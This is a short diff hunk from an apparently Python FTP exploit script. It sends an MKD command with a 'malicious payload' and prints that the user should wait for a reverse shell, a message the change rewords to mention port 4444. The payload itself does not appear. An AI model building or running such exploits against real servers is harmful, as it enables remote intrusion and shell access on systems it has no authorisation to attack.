@@ -65,7 +65,7 @@ try:
 	expl.send('MKD ' + payload + '\r\n')
 	expl.recv(1024)
 	print("[x] Sending MKD command and malicious payload")
-	print("[x]wait for reverse shell")
+	print("[x] Wait for reverse shell on 4444")
 	expl.send('QUIT\r\n')
 	expl.close
 except:
